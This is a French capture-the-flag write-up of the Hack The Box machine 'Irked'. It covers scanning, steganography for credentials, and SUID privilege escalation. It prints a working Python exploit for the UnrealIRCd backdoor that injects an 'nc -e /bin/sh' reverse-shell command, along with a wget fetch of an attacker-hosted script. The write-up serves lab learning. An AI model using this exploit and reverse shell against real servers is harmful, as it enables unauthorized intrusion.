# Irked writeups by Seyptoo.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/05/7/1549211802-capture-du-2019-02-03-17-36-26.png)](https://hackthebox.eu/)

Informations
----
    Ip :  10.10.10.117      Created by : MrAgent
    Level : Easy    Base Points : 20
    
Nmap Scan
----
    PORT    STATE SERVICE VERSIONT 
    22/tcp  open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
    |   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
    |_  256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
    80/tcp  open  http    Apache httpd 2.4.10 ((Debian))
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    111/tcp open  rpcbind 2-4 (RPC #100000)
    | rpcinfo: 
    |   program version   port/proto  service
    |   100000  2,3,4        111/tcp  rpcbind
    |   100000  2,3,4        111/udp  rpcbind
    |   100024  1          33919/tcp  status
    |_  100024  1          41815/udp  status
    Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Feb  1 20:13:26 2019 -- 1 IP address (1 host up) scanned in 69.20 seconds
    
Une ancienne version de SSH et également pour le HTTP.

HTTP
----
Dans le serveur HTTP il y'a rien de spécial mais par contre il y'a une image avec un smyle et un texte "IRC is almost working!".
Donc il faut sans doute chercher un port en rapport avec le serveur IRC.

Nmap Scan
----
    Nmap scan report for 10.10.10.117
    Host is up (0.050s latency).
    PORT      STATE SERVICE VERSION
    22/tcp    open  ssh     OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    | ssh-hostkey: 
    |   1024 6a:5d:f5:bd:cf:83:78:b6:75:31:9b:dc:79:c5:fd:ad (DSA)
    |   2048 75:2e:66:bf:b9:3c:cc:f7:7e:84:8a:8b:f0:81:02:33 (RSA)
    |_  256 c8:a3:a2:5e:34:9a:c4:9b:90:53:f7:50:bf:ea:25:3b (ECDSA)
    80/tcp    open  http    Apache httpd 2.4.10 ((Debian))
    |_http-server-header: Apache/2.4.10 (Debian)
    |_http-title: Site doesn't have a title (text/html).
    6697/tcp  open  irc     Unreal ircd
    8067/tcp  open  irc     Unreal ircd
    65534/tcp open  irc     Unreal ircd
    Service Info: Host: irked.htb; OS: Linux; CPE: cpe:/o:linux:linux_kernel

    Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
    # Nmap done at Fri Feb  1 20:17:53 2019 -- 1 IP address (1 host up) scanned in 11.12 seconds

IRC
----

Après avoir énumérer beaucoup de temps le serveur IRC est vulnérable à l'éxecution de code il y'a un module spécifique sur Metasploit pour exploiter ça, mais personnellement j'ai essayer de comprendre l'éxecution de code et de créer mon outil par moi même.

L'exploit :

    root@Computer:~/htb/writeup/Irked/nmap# find / -type f -name "unreal_ircd_3281_backdoor.rb" -print 2>/dev/null
    [SNIP...]
    /opt/metasploit-framework/embedded/framework/modules/exploits/unix/irc/unreal_ircd_3281_backdoor.rb
    [SNIP...]
    
Voila nous avons enfin accès au fichier nous allons essayer de lire le fichier ruby.

    def exploit
        connect

        print_status("Connected to #{rhost}:#{rport}...")
        banner = sock.get_once(-1, 30)
        banner.to_s.split("\n").each do |line|
          print_line("    #{line}")
        end

        print_status("Sending backdoor command...")
        sock.put("AB;" + payload.encoded + "\n") # Tout ce passe ici.

        # Wait for the request to be handled
        1.upto(120) do
          break if session_created?
          select(nil, nil, nil, 0.25)
          handler()
        end
        disconnect
      end
    end

Voila comme vous pouvez le voir **sock.put("AB;" + payload.encoded + "\n")** l'éxecution du code ce passe ici, vous pouvez essayer par vous même avec le protocole Telnet. Vous pouvez par exemple envoyer une commande **AB; ping -c 1 10.10.13.181** et récupérer les datagrammes ICMP.

    root@Computer:/home/seyptoo# tcpdump -i tun0 icmp
    tcpdump: verbose output suppressed, use -v or -vv for full protocol decode
    listening on tun0, link-type RAW (Raw IP), capture size 262144 bytes
    17:53:47.933432 IP 10.10.10.117 > 10.10.13.181: ICMP echo request, id 1641, seq 1, length 64
    17:53:47.933485 IP 10.10.13.181 > 10.10.10.117: ICMP echo reply, id 1641, seq 1, length 64
    
Une commande basique et nous récevons bien les paquets ICMP. J'ai créer un outil en python pour faire un reverse shell.

    #coding:utf-8

    import sys
    import socket

    try:
            # Let's test if the arguments are open during execution.
            # The host and the port are the services to attack.

            HOST = sys.argv[1]
            PORT = sys.argv[2]

            # You will need to make a netcat to do the reverse shell.
            # And it's something optional.
    except IndexError as e:
            sys.exit(e)

    CMDS = "nc -e /bin/sh 127.0.0.1 1234" # Change this.

    def ArgumentTest():
            ServiceDown = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            ServiceDown.connect((str(HOST), int(PORT)))
            ServiceDown.send("AB;" + CMDS + "\n")
            ServiceDown.recv(1024).decode()

    if __name__ == "__main__":
            ArgumentTest()
            
N'oublier pas de modifier l'adresse IP dans la variable **CMDS** par défault c'est l'adresse de loopback. L'utilisation est très simple.

[![forthebadge made-with-python](https://image.noelshack.com/fichiers/2019/05/7/1549213189-capture-du-2019-02-03-17-59-40.png)](https://hackthebox.eu/)

Voilà nous un shell. Attention il faut d'abord écouter un port et faut que le port sois identique dans le script que j'ai crée. Donc l'accès initial étais très simple.

    ircd@irked:/home/djmardov/Documents$ ls -alv
    total 16
    drwxr-xr-x  2 djmardov djmardov 4096 May 15  2018 .
    drwxr-xr-x 18 djmardov djmardov 4096 Nov  3 04:40 ..
    -rw-r--r--  1 djmardov djmardov   52 May 16  2018 .backup
    -rw-------  1 djmardov djmardov   33 May 15  2018 user.txt
    
Nous avons un fichier backup allons lire ça.

    ircd@irked:/home/djmardov/Documents$ cat .backup
    cat .backup
    Super elite steg backup pw
    UPupDOWNdownLRlrBAbaSSs
  
Après avoir chercher pendant des heures, j'ai enfin trouvé ce mot de passe correspondais simplement à l'image sur le serveur HTTP c'étais de la stéganographie.

    root@Computer:/home/seyptoo/Bureau# steghide extract -sf index.jpeg
    Entrez la passphrase: 
    riture des donns extraites dans "pass.txt".
    root@Computer:/home/seyptoo/Bureau# cat pass.txt 
    Kab6h+m+bbp2J:HG

Nous avons enfin accès à l'utilisateur. Utilisons la commande su pour se connecter ou bien se connecter en SSH (Recommandé) pour ne pas avoir d'exclusion de shell etc..

    root@Computer:~/htb/writeup/Irked/www# ssh djmardov@10.10.10.117
    djmardov@10.10.10.117's password: 

    The programs included with the Debian GNU/Linux system are free software;
    the exact distribution terms for each program are described in the
    individual files in /usr/share/doc/*/copyright.

    Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
    permitted by applicable law.
    Last login: Tue May 15 08:56:32 2018 from 10.33.3.3
    djmardov@irked:~$ cat Documents/user.txt 
    4a66a[...SNIP...]
    
PrivEsc
----
Pour le privesc rien de compliqué cherchons les fichiers SUID avec la commande **find**.

    djmardov@irked:~$ find / -user root -perm -4000 2>/dev/null
    [...SNIP...]
    /usr/bin/viewuser
    [...SNIP...]
    
Donc si nous lançons ce fichier.

    djmardov@irked:~$ /usr/bin/viewuser
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2019-02-03 12:09 (:0)
    djmardov pts/0        2019-02-03 12:09 (10.10.13.181)
    sh: 1: /tmp/listusers: not found
   
Il ne trouve pas le fichier listusers donc nous allons créer un fichier bash depuis notre machine physique et le transférer vers la machine distante.

Le fichier bash :

    #!/bin/sh

    /bin/sh

Et nous transférons ce fichier avec la commande **python -m SimpleHTTPServer**.

    djmardov@irked:/tmp$ wget http://10.10.13.181:8000/listusers
    --2019-02-03 12:16:05--  http://10.10.13.181:8000/listusers
    Connecting to 10.10.13.181:8000... connected.
    HTTP request sent, awaiting response... 200 OK
    Length: 19 [application/octet-stream]
    Saving to: ‘listusers’

    listusers                                100%[==================================================================================>]      19  --.-KB/s   in 0s     

    2019-02-03 12:16:05 (2.19 MB/s) - ‘listusers’ saved [19/19]

    djmardov@irked:/tmp$
    
Et le résultat dans Python.

    root@Computer:~/htb/writeup/Irked/www# python -m SimpleHTTPServer
    Serving HTTP on 0.0.0.0 port 8000 ...
    10.10.10.117 - - [03/Feb/2019 18:16:05] "GET /listusers HTTP/1.1" 200 -
    
Une fois le fichier transférer suffis de le chmod et d'éxecuter le programme viewusers.

    djmardov@irked:/tmp$ chmod +x listusers 
    djmardov@irked:/tmp$ viewuser
    This application is being devleoped to set and test user permissions
    It is still being actively developed
    (unknown) :0           2019-02-03 12:09 (:0)
    djmardov pts/0        2019-02-03 12:09 (10.10.13.181)
    djmardov pts/5        2019-02-03 12:15 (10.10.12.230)
    djmardov pts/6        2019-02-03 12:15 (10.10.13.22)
    # bash
    root@irked:/tmp# cat /root/root.txt
    8d8e9[...SNIP...]
    
Merci d'avoir pris le temps de lire.
